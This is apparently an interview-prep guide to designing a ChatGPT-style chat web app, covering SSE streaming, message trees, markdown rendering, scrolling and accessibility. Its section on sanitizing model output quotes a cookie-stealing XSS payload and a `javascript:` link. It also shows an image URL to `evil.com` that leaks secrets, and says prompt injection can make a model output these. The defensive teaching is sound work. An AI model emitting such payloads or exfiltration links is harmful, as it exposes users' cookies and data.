# AI Chat Interface (e.g. ChatGPT / Claude web app)

> **Difficulty:** Medium · **Asked at:** product companies adding AI features (Razorpay, CRED, Groww, Swiggy support bots), AI startups, and any team building an in-app assistant · **Time in interview:** 45 min
> Not on GreatFrontEnd's list; common at Indian product companies.

**How to use this file:** set a 35-minute timer, answer on paper or Excalidraw while talking out loud, then read below and note what you missed in "My mistakes" at the bottom.

## 0. Clarifying questions to ask first

- Is this a full chat app (sidebar with many conversations) or a small support widget inside another app? → Assume: full web app with a conversation list, like ChatGPT.
- Should the answer appear token by token (streaming), or all at once? → Assume: streaming. It is the main point of the question.
- What does the model output? Plain text, markdown, code blocks, tables, images? → Assume: markdown with code blocks and tables. No model-generated images.
- Can users edit an old message and get a new answer? Do we keep the old version? → Assume: yes, and we keep both versions as branches (the "< 2/2 >" switcher).
- Do we support file and image uploads? → Assume: yes, images and PDFs up to 20 MB each, max 5 per message.
- Mobile web too, or desktop only? → Assume: both. Responsive, mobile is around 40% of traffic.
- Is there a rate limit or a free tier with a message cap? → Assume: yes. Free users get ~20 messages per 3 hours. The UI must show this nicely.
- How long can a conversation get? → Assume: up to a few hundred messages, some with 5,000+ word answers.
- Do we need sharing, search, voice? → Assume: out of scope, mention later.

## 1. Requirements

### Functional

- Send a message and see the AI answer stream in, token by token.
- Render markdown: headings, lists, tables, links, inline code, and code blocks with syntax highlight and a "Copy" button.
- Stop a response while it is streaming. Regenerate the last response.
- Edit an earlier user message. This creates a new branch. User can switch between branches.
- Sidebar with past conversations, sorted by last updated. Create, rename, delete.
- Attach images and files to a message.
- Show clear errors: network failed, server error, rate limited, message too long.

### Non-functional (performance, accessibility, devices, network)

- **First token fast:** user should see something within ~1 s of pressing Enter. Show a "thinking" state right away.
- **Smooth streaming:** the page must stay at 60 fps while 30–100 tokens per second arrive. Typing in the input must never lag.
- **Long chats:** a 300-message conversation must open in under 1 s and scroll smoothly.
- **Security:** model output is untrusted. No raw HTML injection. No XSS from markdown.
- **Accessibility:** keyboard-only use works. Screen readers hear the answer once, not every token.
- **Network:** works on flaky 4G. If the stream breaks midway, keep the partial text and offer "Retry".
- **Devices:** mobile keyboard must not cover the input; auto-scroll must not fight the user.

### Out of scope

- The model itself, prompt design, and backend token generation.
- Voice input and output.
- Shared public links, team workspaces, search across chats.
- Plugins / tool calling UI (mention as a follow-up).

## 2. Architecture

```text
+--------------------------------------------------------------------------+
|                               Browser                                    |
|                                                                          |
|  +----------------+   +----------------------------------------------+   |
|  |  Sidebar       |   |  ChatView                                    |   |
|  |  (conv list)   |   |   +--------------------------------------+   |   |
|  |  - New chat    |   |   | MessageList (virtualized)            |   |   |
|  |  - Rename/Del  |   |   |   MessageItem -> MarkdownRenderer    |   |   |
|  +-------+--------+   |   |   + BranchSwitcher + Actions         |   |   |
|          |            |   +--------------------------------------+   |   |
|          |            |   | Composer (textarea, attach, send/stop)|  |   |
|          |            |   +------------------+-------------------+   |   |
|          |            +----------------------|-----------------------+   |
|          v                                   v                           |
|  +-------------------------------------------------------------------+   |
|  |  Client Store (Zustand / Redux)                                   |   |
|  |  conversations, messages by id, activeLeafId, streaming state     |   |
|  +---------+-----------------------------+---------------------------+   |
|            |                             |                               |
|  +---------v---------+        +----------v-----------+  +-------------+  |
|  | REST client       |        | StreamClient         |  | Uploader    |  |
|  | (React Query)     |        | fetch + ReadableStream| | (presigned  |  |
|  | list/get/rename   |        | + AbortController    |  |  URL, S3)   |  |
|  +---------+---------+        +----------+-----------+  +------+------+  |
+------------|-----------------------------|----------------------|--------+
             v                             v                      v
      +-------------+              +---------------+       +-------------+
      |  API server |              | Chat stream   |       | Object store|
      |  (REST)     |              | endpoint (SSE)|       | (S3 / CDN)  |
      +-------------+              +---------------+       +-------------+
```

| Component | Responsibility |
|---|---|
| Sidebar | List of conversations (paginated), new chat, rename, delete. Uses React Query cache. |
| ChatView | Loads one conversation by id from the URL (`/c/:id`). Owns scroll logic. |
| MessageList | Virtualized list of messages on the active branch. Handles "stick to bottom". |
| MessageItem | One message: avatar, content, actions (copy, edit, regenerate), branch switcher. Memoized. |
| MarkdownRenderer | Parses markdown into blocks, sanitizes, renders. Caches finished blocks while streaming. |
| Composer | Textarea that grows, attachments, Send / Stop button, Enter to send, Shift+Enter for new line. |
| Client Store | Normalized messages map, active leaf per conversation, stream status. |
| StreamClient | Opens POST stream, parses SSE events, pushes tokens into a buffer, handles abort. |
| Uploader | Gets a presigned URL, uploads file directly to S3 with progress, returns `fileId`. |

**Main flow: user sends a message**

1. User types and presses Enter. Composer calls `sendMessage(text, fileIds)`.
2. Store adds the user message right away with a temp id and `status: "sending"` (optimistic). It also adds an empty assistant message with `status: "streaming"`.
3. StreamClient sends `POST /conversations/:id/messages` with `Accept: text/event-stream` and an `AbortController` signal.
4. Server replies with events: `message_start` (real ids), many `delta` events (text chunks), then `message_end`.
5. Each delta is appended to a buffer. Once per animation frame, the buffer is flushed into the store. Only the streaming message re-renders.
6. MarkdownRenderer re-parses only the last unfinished block. Finished blocks stay memoized.
7. If the user is at the bottom, the list auto-scrolls. If they scrolled up, it stops and shows a "↓ Jump to latest" button.
8. On `message_end`, status becomes `"done"`, the sidebar entry moves to the top, and the screen reader gets one announcement.

## 3. Data model

```ts
type Role = "user" | "assistant" | "system";

type MessageStatus =
  | "sending"      // optimistic user message, not confirmed yet
  | "streaming"    // assistant message receiving tokens
  | "done"
  | "stopped"      // user pressed Stop; partial text kept
  | "error";       // stream failed; partial text kept + retry

interface Attachment {
  id: string;            // fileId from upload
  name: string;
  mimeType: string;      // "image/png", "application/pdf"
  sizeBytes: number;
  previewUrl?: string;   // object URL locally, CDN URL after upload
  uploadProgress?: number; // 0-100, client only
}

interface Message {
  id: string;
  conversationId: string;
  parentId: string | null; // tree: each message points to the one before it
  role: Role;
  content: string;         // raw markdown
  attachments: Attachment[];
  status: MessageStatus;
  error?: { code: "network" | "rate_limited" | "server" | "too_long"; retryAfterSec?: number };
  createdAt: string;
  model?: string;
}

interface Conversation {
  id: string;
  title: string;           // auto-generated after first reply, user can rename
  updatedAt: string;
  currentLeafId: string;   // last message of the branch the user is viewing
}
```

**Why a tree?** Editing message 3 creates a new message with the same `parentId` as the old message 3. Now message 2 has two children. The visible chat is the path from root to `currentLeafId`. The branch switcher shows "2 / 2" by counting siblings.

```ts
// Client store shape (normalized)
interface ChatState {
  conversations: Record<string, Conversation>;
  messages: Record<string, Message>;
  childrenOf: Record<string, string[]>; // parentId -> child ids, in order
  streaming: { messageId: string; controller: AbortController } | null;
}

// Build visible thread: walk up from leaf to root, then reverse.
function getThread(state: ChatState, leafId: string): Message[] {
  const out: Message[] = [];
  let cur: string | null = leafId;
  while (cur) { const m = state.messages[cur]; out.push(m); cur = m.parentId; }
  return out.reverse();
}
```

| Entity | Lives in | Why |
|---|---|---|
| Conversation list | Server + React Query cache | Source of truth is server; cache gives instant sidebar and background refresh. |
| Messages of open chat | Server + client store (normalized) | Need fast updates per token and tree lookups; store makes that cheap. |
| Active conversation id | URL (`/c/:id`) | Shareable, back button works, refresh keeps place. |
| Current branch leaf | Server (`currentLeafId`) + client store | Opening the chat on another device shows the same branch. |
| Streaming buffer | Ref inside StreamClient | Changes 50+ times per second; must not trigger React renders directly. |
| Composer draft text | Component state + localStorage per conversation | Do not lose a long prompt if the tab reloads. |
| Upload progress, previews | Component state | Temporary, UI only. |
| "Is user at bottom" flag | Ref in MessageList | Read on every scroll; no need to re-render. |

## 4. Interface (API)

### Component API (props of the key components)

```ts
interface ChatViewProps {
  conversationId: string | null; // null = new chat
}

interface MessageListProps {
  messages: Message[];            // active branch only
  streamingMessageId?: string;
  onEdit(messageId: string, newText: string): void;
  onRegenerate(messageId: string): void;
  onSwitchBranch(messageId: string, direction: -1 | 1): void;
}

interface MarkdownRendererProps {
  content: string;
  isStreaming: boolean;           // true -> cache finished blocks, show cursor
}

interface ComposerProps {
  disabled: boolean;              // e.g. rate limited
  isStreaming: boolean;           // shows Stop instead of Send
  onSend(text: string, attachments: Attachment[]): void;
  onStop(): void;
  maxChars: number;               // e.g. 32000
}
```

### Server API

| Endpoint | Method | Params | Purpose |
|---|---|---|---|
| `/conversations?cursor=&limit=30` | GET | cursor pagination | Sidebar list |
| `/conversations/:id` | GET | – | All messages (tree) + `currentLeafId` |
| `/conversations/:id` | PATCH | `{ title?, currentLeafId? }` | Rename, save branch choice |
| `/conversations/:id` | DELETE | – | Delete chat |
| `/conversations/:id/messages` | POST (streams) | `{ parentId, content, attachmentIds, clientMessageId }` | Send + stream answer |
| `/messages/:id/regenerate` | POST (streams) | – | New assistant sibling for same parent |
| `/uploads` | POST | `{ name, mimeType, sizeBytes }` | Returns presigned URL + `fileId` |

Example `GET /conversations?limit=2`:

```json
{
  "items": [
    { "id": "c_91", "title": "Debounce vs throttle", "updatedAt": "2026-11-26T10:12:00Z" },
    { "id": "c_90", "title": "Zepto cart design", "updatedAt": "2026-11-25T18:40:00Z" }
  ],
  "nextCursor": "eyJ1IjoiMjAyNi0xMS0yNSJ9"
}
```

Streaming response (`Content-Type: text/event-stream`):

```text
event: message_start
data: {"userMessageId":"m_201","assistantMessageId":"m_202","clientMessageId":"tmp_7"}

event: delta
data: {"text":"Debounce waits until"}

event: delta
data: {"text":" the user stops typing"}

event: message_end
data: {"finishReason":"stop","usage":{"outputTokens":412}}

event: error
data: {"code":"rate_limited","retryAfterSec":5400,"message":"Limit reached"}
```

`clientMessageId` lets the client swap its temp id for the real one. It also makes the POST idempotent: if the client retries with the same id, the server does not create a duplicate.

## 5. Optimizations and deep dives

### 5.1 Streaming: SSE over fetch, not WebSocket by default

**What is SSE?** Server-Sent Events. The server keeps one HTTP response open and writes small `event:`/`data:` lines as they are ready.

Why not the built-in `EventSource`? It only supports GET and no custom headers. We need POST with a JSON body and an auth header. So we use `fetch` and read `response.body` as a stream.

```ts
async function streamChat(body: object, signal: AbortSignal, onEvent: (e: SSEEvent) => void) {
  const res = await fetch("/api/conversations/c_91/messages", {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "text/event-stream" },
    body: JSON.stringify(body),
    signal,
  });
  if (res.status === 429) throw new RateLimitError(Number(res.headers.get("Retry-After")));
  if (!res.ok || !res.body) throw new HttpError(res.status);

  const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
  let buffer = "";
  while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    buffer += value;
    const parts = buffer.split("\n\n");   // one SSE event ends with a blank line
    buffer = parts.pop()!;                 // last part may be incomplete; keep it
    for (const raw of parts) onEvent(parseSSE(raw));
  }
}
```

Key point: one network chunk can hold half an event or three events. Always keep the leftover in a buffer.

**Why not WebSocket by default?**
- The flow is request → one long response. That is exactly what HTTP streaming is for. WebSocket is for two-way, ongoing talk.
- SSE works with normal HTTP: auth cookies, load balancers, CDNs, HTTP/2, and logging all just work.
- WebSocket needs sticky sessions, its own reconnect and heartbeat logic, and some corporate proxies block it.
- When WebSocket makes sense: real-time collaboration (two people in one chat), voice mode, or server-pushed events when no request is active.

### 5.2 Rendering streamed markdown without re-parsing everything

**Problem:** a 4,000-token answer at 60 tokens/sec. If we re-parse and re-render the full markdown on every token, that is a full parse of a growing string 60 times a second. On a mid-range Android phone this drops frames and the input lags.

**Fix 1 – batch tokens with requestAnimationFrame.** Tokens go into a ref. We flush at most once per frame (~16 ms).

```ts
const pending = useRef("");
const scheduled = useRef(false);

function onDelta(text: string) {
  pending.current += text;
  if (scheduled.current) return;
  scheduled.current = true;
  requestAnimationFrame(() => {
    appendToMessage(streamingId, pending.current); // one store update
    pending.current = "";
    scheduled.current = false;
  });
}
```

60 tokens/sec now becomes at most 60 renders/sec, and usually fewer because many tokens land in the same frame. Some apps flush every 50 ms instead — still feels live.

**Fix 2 – split into blocks and memoize finished ones.** Markdown is a list of blocks (paragraph, list, code block, table). While streaming, only the **last** block can change. All blocks before it are final.

```tsx
const Block = memo(function Block({ source }: { source: string }) {
  return <SafeMarkdown source={source} />;  // parse + sanitize this block only
}); // re-renders only if `source` string changes

function MarkdownRenderer({ content, isStreaming }: MarkdownRendererProps) {
  const blocks = useMemo(() => splitIntoBlocks(content), [content]); // cheap lexer, not full render
  return (
    <>
      {blocks.map((b, i) => <Block key={i} source={b} />)}
      {isStreaming && <span className="cursor" aria-hidden />}
    </>
  );
}
```

`splitIntoBlocks` must respect code fences: a blank line inside ```` ``` ```` does not end the block. Since old blocks keep the same string, `memo` skips them. Cost per frame is now about the size of the last block, not the full answer.

**Fix 3 – handle half-written markdown.** Mid-stream you may get an open ```` ``` ```` with no close, or `**bold` without the end. Temporarily close open fences before parsing the last block, so the code shows as a code block, not as a wall of plain text that suddenly changes.

**Fix 4 – syntax highlighting is expensive.** Highlight a code block only when it is finished (its closing fence arrived), or run it in a Web Worker. While streaming, show it as plain monospace text.

### 5.3 Stop and regenerate with AbortController

```ts
function send(text: string) {
  const controller = new AbortController();
  store.startStreaming(assistantId, controller);
  streamChat(body, controller.signal, handleEvent)
    .catch((err) => {
      if (err.name === "AbortError") store.markStopped(assistantId); // keep partial text
      else store.markError(assistantId, toErrorCode(err));
    });
}

function stop() { store.streaming?.controller.abort(); }
```

- Aborting the fetch closes the connection. The server sees the disconnect and stops generating, so we stop paying for tokens.
- The partial answer stays, with status `"stopped"`. The server saves what it sent so far.
- **Regenerate** = new assistant message with the same `parentId` as the old one. The old one is kept as a sibling branch. So regenerate and edit use the same tree logic.
- Abort on route change too: if the user opens another chat while streaming, either abort or let it finish in the background and only update the store (ChatGPT keeps it going). I would keep it going but stop auto-scroll.
- Only one stream per conversation at a time. Disable Send while streaming; show Stop.

### 5.4 Auto-scroll that respects the user

Rule: stick to the bottom **only if** the user was already near the bottom.

```ts
const atBottom = useRef(true);

function onScroll(e: React.UIEvent<HTMLDivElement>) {
  const el = e.currentTarget;
  atBottom.current = el.scrollHeight - el.scrollTop - el.clientHeight < 80; // 80px threshold
  setShowJumpButton(!atBottom.current);
}

useLayoutEffect(() => {
  if (atBottom.current) bottomRef.current?.scrollIntoView({ block: "end" });
}, [streamingContentLength]);
```

- Use a threshold (80 px), not exact zero. Sub-pixel values and growing content make "exactly bottom" flaky.
- When the user sends a new message, always scroll to bottom (they clearly want to see the answer).
- Do not use `behavior: "smooth"` on every frame. Smooth scrolls pile up and feel jumpy. Use instant scroll while streaming.
- Alternative: CSS `overflow-anchor` or `flex-direction: column-reverse` so the browser keeps the bottom pinned. Simple, but harder to combine with virtualization.
- Show a floating "↓" button when not at bottom, maybe with "New content" if a stream is running.

### 5.5 Long conversations: virtualization

**What is virtualization?** Only render the rows you can see (plus a few extra). Rows above and below are replaced by empty space.

- Messages have very different heights (one line vs 3 screens of code), and the height changes while streaming. Use a library with **dynamic measurement**: `@tanstack/react-virtual` with `measureElement`, or `react-virtuoso` (has built-in "follow output" for chat).
- Turn it on only above ~50 messages. Short chats do not need it, and it keeps Ctrl+F working for most chats. Mention this trade-off: virtualized content is not findable with browser find.
- Load the newest 50 messages first, then load older ones when the user scrolls to the top. When prepending, keep the scroll position stable (adjust `scrollTop` by the added height).
- Keep the streaming message always mounted.

### 5.6 Sanitizing model output (XSS)

Model output is **untrusted user-like input**. A prompt injection can make the model print `<img src=x onerror=alert(document.cookie)>` or a `[click](javascript:...)` link.

- Never use `dangerouslySetInnerHTML` with raw model text.
- Use a markdown parser that turns markdown into React elements (e.g. `react-markdown`), with raw HTML **disabled**. Then `<script>` just shows as text.
- If you must allow some HTML, run it through DOMPurify with an allowlist.
- Links: allow only `http:`, `https:`, `mailto:`. Add `rel="noopener noreferrer nofollow"` and `target="_blank"`.
- Images in markdown: either block them or proxy them. A model can leak data via `![](https://evil.com/?q=<secret>)` because the browser loads it automatically.
- Add a strict Content-Security-Policy as a second layer: no inline scripts.
- Code blocks: render as text inside `<pre><code>`, never execute. If you add an "HTML preview" feature, put it in a sandboxed `<iframe sandbox>` on a different origin.

### 5.7 Attachments and accessibility (short)

**Attachments**
- Validate type and size on the client first (fast feedback), server checks again.
- Ask server for a presigned URL, upload straight to S3 with `XMLHttpRequest` (for progress events) or fetch. Show a thumbnail using `URL.createObjectURL` right away.
- Resize big images on the client (canvas, max 2048 px) before upload — saves 5–10× bandwidth on 4G.
- Send button is disabled until all uploads finish; the message only sends `fileId`s.

**Accessibility**
- Do not put `aria-live` on the streaming text. A screen reader would read every tiny update, or restart again and again.
- Instead: a separate visually-hidden `aria-live="polite"` region. Announce "Assistant is responding" at start, then the full answer (or "Response ready") once at `message_end`.
- Message list as `role="log"`. Each message labelled ("You said", "Assistant said").
- Stop button reachable by keyboard; `Esc` also stops. Focus goes back to the textarea after send.
- Respect `prefers-reduced-motion`: no blinking cursor animation.

### Also mention

- Auto-title the chat from the first exchange (a cheap server call after the first reply).
- Persist the composer draft per chat in localStorage.
- Prefetch a conversation on sidebar hover.
- Optimistic rename and delete in the sidebar with rollback on failure.
- Code block "Copy" uses `navigator.clipboard.writeText` and shows "Copied" for 2 s.
- Token counter or warning when input is near the max length.
- Lazy-load the syntax highlighter and math (KaTeX) libraries; they are 100–300 KB.

## 6. Trade-offs

| Decision | Option A | Option B | What I'd pick and why |
|---|---|---|---|
| Transport | SSE over fetch | WebSocket | SSE. One request, one streamed reply. Works with normal HTTP infra. WebSocket only for real-time collab or voice. |
| Reading stream | `EventSource` | `fetch` + `ReadableStream` | fetch. EventSource is GET-only with no custom headers. |
| Render rate | Render on every token | Batch per animation frame | Batch. Same feel for the user, far less CPU. |
| Markdown rendering | Re-parse full text each update | Split into blocks, memoize finished ones | Blocks. Cost stays flat as the answer grows. |
| Message storage | Flat array | Tree with `parentId` | Tree. Needed for edit and regenerate branches. A flat list loses old versions. |
| Long chat | Render all | Virtualize | Virtualize above ~50 messages. Below that, render all for simplicity and Ctrl+F. |
| HTML in output | Allow with DOMPurify | Disable raw HTML | Disable. Smaller attack surface; markdown covers 99% of needs. |
| Stream on navigation | Abort | Keep running in background | Keep running. User may come back; aborting wastes the answer. |

## 7. Likely follow-up questions

**Q1. The stream breaks halfway because of bad network. What happens?**
The reader throws. Keep the partial text and mark the message `"error"` with a "Retry" button. Retry calls regenerate for the same parent. A better version: the server stores the generation, and the client resumes with `GET /messages/:id/stream?offset=1234`.

**Q2. User opens the same chat in two tabs. How do you sync?**
Use `BroadcastChannel` to tell other tabs "new message in c_91" so they refetch. Or refetch on window focus with React Query. Block sending from both tabs at once using the server's conversation lock (409 response).

**Q3. How do you show the rate limit?**
On 429, read `Retry-After`. Disable the composer and show "You've reached the limit. Try again at 4:30 PM" with an upgrade link. Keep the typed draft. Re-enable with a timer.

**Q4. How do you make the first token feel faster?**
Show the optimistic user message and a "thinking" indicator in the same frame as Enter. Pre-open nothing heavy. Keep the stream endpoint on HTTP/2 so no new TLS handshake is needed. Lazy-load highlighter so it does not block the main thread.

**Q5. How would you test the streaming UI?**
Unit-test the SSE parser with chunks split at odd places (mid-event, mid-UTF-8 character). Mock the stream in MSW with delays. Playwright test: send, stop, check partial text stays.

**Q6. How do you handle tool calls or "searching the web" steps?**
Add new event types: `tool_start`, `tool_result`. Store them as content parts on the message: `parts: [{type:"text"}, {type:"tool_call"}]`. Render each part type with its own component.

**Q7. Why not keep everything in React state with useState?**
Per-token updates would re-render the whole tree. A store with selectors (Zustand) lets only the streaming MessageItem subscribe to its own content.

**Q8. How do you prevent duplicate messages on double click or retry?**
Disable Send while a request is in flight. Send a `clientMessageId`; the server ignores repeats with the same id.

**Q9. How would you add offline support?**
Cache the conversation list and recent chats in IndexedDB. Show them read-only offline. Queue the outgoing message and send when `online` fires — but tell the user it is queued, since the answer needs the server.

## 8. If you only have 60 seconds

- Messages are a **tree** (`parentId`) so edit and regenerate create branches; the screen shows the path to `currentLeafId`.
- Stream with **SSE over fetch + ReadableStream** (POST, auth headers); WebSocket only if we need two-way real-time.
- Tokens go into a ref and flush **once per animation frame**; markdown is split into **blocks** and finished blocks are memoized.
- **AbortController** for Stop; partial text is kept; regenerate adds a sibling.
- Auto-scroll **only if the user is near the bottom**; otherwise show a "Jump to latest" button.
- Model output is untrusted: **no raw HTML, safe link protocols, CSP**.
- Accessibility: **one aria-live announcement at the end**, not per token; virtualize long chats.

## 9. How to spend 45 minutes

| Minutes | Section | What to cover |
|---|---|---|
| 0–4 | Clarify | Streaming, markdown, branches, attachments, rate limits, mobile. |
| 4–8 | Requirements | Functional list + "60 fps while streaming", security, a11y. |
| 8–15 | Architecture | Box diagram, store, StreamClient, the send flow in steps. |
| 15–21 | Data model | Message tree with `parentId`, statuses, where each piece lives. |
| 21–26 | API | REST endpoints + SSE event format, `clientMessageId`. |
| 26–40 | Deep dives | Streaming parse, rAF batching + block memo, Stop, auto-scroll, XSS. |
| 40–45 | Trade-offs + wrap-up | SSE vs WebSocket, virtualization, then take questions. |

## Common mistakes

- Jumping to components before defining data/entities — especially missing that messages form a **tree** for edits and regenerates.
- Saying "use WebSocket" without a reason, or using `EventSource` without knowing it cannot POST.
- Calling `setState` on every token and re-parsing the full markdown each time.
- Rendering model output with `dangerouslySetInnerHTML` — an XSS hole.
- Auto-scrolling always, which yanks the user back down while they read.
- Putting `aria-live` on the streaming text so the screen reader reads every token.

## My mistakes

- [ ]
